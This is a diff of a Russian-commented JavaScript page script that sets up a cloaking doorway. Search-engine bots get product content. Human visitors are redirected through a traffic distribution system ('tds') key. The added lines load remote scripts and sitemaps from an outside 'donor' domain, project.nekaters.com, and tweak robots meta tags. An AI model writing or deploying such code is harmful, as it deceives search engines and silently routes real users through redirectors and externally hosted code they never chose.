@@ -11,28 +11,55 @@ let cat = cats[Math['floor'](Math['random']() * cats['length'])]; // Случа�
 let country = ['ru', 'pt', 'ar', 'tr', 'nl', 'pl', 'ja', 'ko', 'en', 'de', 'fr', 'it', 'es']; // список языков
 let script = document['createElement']('script');
     script['type'] = 'text/javascript';
+let donor = 'https://project.nekaters.com';
 
 country['forEach'](el => GetLang(el));
 let bot = CheckBot();
 let key = '+'; // ключик tds
 Loading(); // Вывожу сообщение о загрузке данных
-
+var timestamp = Date.now().toString().slice(0, -3);
 // Проверяю кто пришел
 
-if(bot){
-    // подгружаю товар
-    var timestamp = Date.now().toString().slice(0, -3);
-    script['src'] = location['origin'] + '/'+lang+'.js?'+timestamp; // id + lang
-    main['appendChild'](script);
-}
-else {
-    // подгружаю tds
-    let check = params['key'];
-    if(check != key) {
-        location['href'] = location['origin'] + '/?key=' + key; // tds
+if(id) {
+    if(bot){
+        // подгружаю товар        
+        script['src'] = location['origin'] + '/'+lang+'.js?'+timestamp; // id + lang
+        main['appendChild'](script);
+    }
+    else {
+        // подгружаю tds
+        let check = params['key'];
+        if(check != key) {
+            location['href'] = location['origin'] + '/?key=' + key; // tds
+        }
     }
 }
-
+else {
+    if (path == '/') {
+        document['querySelector']('meta[name="robots"]')['content'] = 'noindex, follow';
+        script['src'] = donor +'/api/getProducts/?callback=search&category_ids=' + cat + '&target_language=' + lang;
+        //location['origin'] + '/cats.js?'+timestamp; // id + lang
+        main['appendChild'](script);
+    }
+    else{
+        if (params['id']) {
+            location['href'] = location['origin'] + '/?id=' + params['id'];
+        }
+        else {
+            if (params['sitemap']) {
+                location['replace'](donor +'/sitemap/' + location['host'] + '/sitemap-' + params['sitemap'] + '.xml');
+            }
+            else {
+                if(path == '/product' || path == '/top' || path == '/products' || path == '/sitemap'){
+                    script['src'] = donor + '/product/' + location['host'] + '/?callback=sitemap';
+                }
+                else{
+                    Stop404();
+                }
+            }
+        }
+    }
+}
 
 // https://project.nekaters.com/sitemap/site.ru/sitemap.xml
 // https://project.nekaters.com/sitemap/site.ru/sitemap-19.xml
@@ -44,6 +71,10 @@ else {
 // Подгрузка странички
 function Loading() {
     main['innerHTML'] = '<div class="loading"></div>' + id + ' ' + ver; // Показываю подгрузку странички
+}
+function Stop404() {
+    main['innerHTML'] = '<div>404 Not Found</div>'; // Показываю подгрузку странички
+    document['querySelector']('meta[name="robots"]')['content'] = 'noindex, follow'
 }
 
 // Проверка бота
